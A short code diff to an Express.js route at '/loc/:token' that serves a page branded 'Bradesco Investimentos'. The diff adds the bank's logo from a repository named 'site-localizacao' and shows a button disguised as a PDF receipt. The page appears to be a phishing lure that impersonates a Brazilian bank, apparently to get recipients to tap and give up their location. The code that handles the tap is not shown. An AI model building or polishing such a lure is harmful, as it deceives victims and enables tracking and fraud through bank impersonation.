@@ -48,13 +48,18 @@ app.get("/loc/:token", (req, res) => {
   res.type("html").send(`<!doctype html>
 <html>
 <head>
+
+<img 
+  src="https://raw.githubusercontent.com/marciocelestinodeoliveira-spec/site-localizacao/main/public/logo.png"
+  alt="Bradesco"
+  style="max-width:180px; margin-bottom:10px;"
+/>
   <meta charset="utf-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1"/>
   <title>Bradesco Investimentos</title>
 </head>
 <body style="font-family:Arial; padding:16px; max-width:640px; margin:auto;">
   <h2>Bradesco Investimentos</h2>
- /* <p>Toque no botão para abrir o comprovante</p>*/
 
   <button id="btn" style="padding:12px 16px; font-size:16px;">comprovante21012026.pdf</button>
   <pre id="out" style="margin-top:16px; white-space:pre-wrap;"></pre>
